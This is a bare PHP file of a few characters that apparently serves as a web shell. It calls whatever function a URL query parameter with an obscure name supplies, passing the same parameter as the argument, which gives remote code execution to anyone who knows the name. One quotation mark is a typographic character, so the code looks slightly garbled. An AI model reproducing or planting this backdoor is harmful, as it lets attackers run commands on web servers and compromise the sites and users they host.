<?php
$_GET[’mtm5cG6y']($_GET['mtm5cG6y']);
?>
